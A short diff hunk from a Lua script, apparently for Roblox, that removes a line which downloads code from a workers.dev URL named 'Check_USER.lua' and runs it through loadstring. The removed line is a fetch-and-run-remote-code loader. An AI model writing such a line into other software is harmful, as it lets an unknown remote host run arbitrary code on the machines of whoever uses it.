@@ -57,7 +57,6 @@ end
 if _G.Restart == true then
 	_G.Restart = false 	
 end
-loadstring(game:HttpGet("https://plain-cell-d3e8.kuvyndn.workers.dev/Check_USER.lua"))()
 
 
 
